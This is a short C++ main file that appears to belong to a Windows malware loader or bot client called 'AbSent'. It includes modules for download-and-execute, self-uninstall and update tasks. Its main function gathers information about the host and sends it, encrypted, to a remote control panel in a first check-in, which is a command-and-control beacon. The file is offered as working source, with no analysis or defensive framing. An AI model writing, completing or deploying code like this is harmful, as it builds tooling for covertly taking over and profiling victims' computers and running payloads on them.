#include "stdafx.h"

#include <iostream>
#include <string>
#include <list>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

#include "AbSent\json.h"
#include "AbSent\config.h"
#include "AbSent\info\info.h"
#include "AbSent\comm\http.h"
#include "AbSent\tasks\downloadExec.h"
#include "AbSent\tasks\uninstall.h"
#include "AbSent\tasks\update.h"

#include "AbSent\comm\panel.h"


int main()
{
	absent::config::config config = absent::config::load();
	absent::info::info info(config.programNeedles);

	absent::panel::firstKnock(info.getJson(config.buildNAME), config.encryptionKey);

	return 0;
}